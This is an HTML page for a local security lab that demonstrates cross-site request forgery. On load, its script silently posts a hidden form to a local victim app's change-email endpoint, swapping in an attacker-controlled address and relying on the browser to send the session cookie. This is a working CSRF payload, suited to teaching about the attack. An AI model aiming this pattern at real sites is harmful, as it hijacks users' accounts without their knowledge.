<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Account Verification</title>
  <style>
    :root { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; color: #20283a; background: #f4f6fa; }
    * { box-sizing: border-box; }
    body { min-height: 100vh; margin: 0; display: grid; place-items: center; padding: 24px; }
    main { width: min(100%, 500px); padding: 30px; background: #fff; border: 1px solid #e1e5ed; border-radius: 14px; box-shadow: 0 12px 36px #1d2a4212; }
    .tag { display: inline-block; padding: 5px 9px; border-radius: 99px; color: #8a4b12; background: #fff2df; font-size: .78rem; font-weight: 700; }
    h1 { margin: 18px 0 8px; font-size: 1.45rem; }
    p { margin: 0; color: #59657a; line-height: 1.55; }
    .detail { margin-top: 18px; padding: 13px; border-radius: 8px; background: #f4f6fa; color: #59657a; font-size: .9rem; }
  </style>
</head>
<body>
  <main>
    <span class="tag">Local security demonstration</span>
    <h1>Loading account verification…</h1>
    <p>This page simulates a forged form submission to the local victim application.</p>
    <div class="detail">The browser will submit the form automatically. No button click is needed.</div>

    <!-- The victim browser submits this POST; this app does not modify victim data. -->
    <form id="forged-action" method="post" action="">
      <input type="hidden" name="email" value="attacker-controlled@example.com">
      <!-- No CSRF token is present in this vulnerable-phase payload. -->
    </form>
    <noscript><p>JavaScript is disabled, so the automatic form submission did not run.</p></noscript>
  </main>
  <script>
    window.addEventListener("DOMContentLoaded", function () {
      const form = document.getElementById("forged-action");
      // Reuse the hostname used to open this page (localhost or 127.0.0.1).
      // The victim and attacker must be opened with the same hostname so the
      // browser sends the victim's host-scoped session cookie on this POST.
      form.action = window.location.protocol + "//" + window.location.hostname + ":5000/change-email";
      form.submit();
    });
  </script>
</body>
</html>
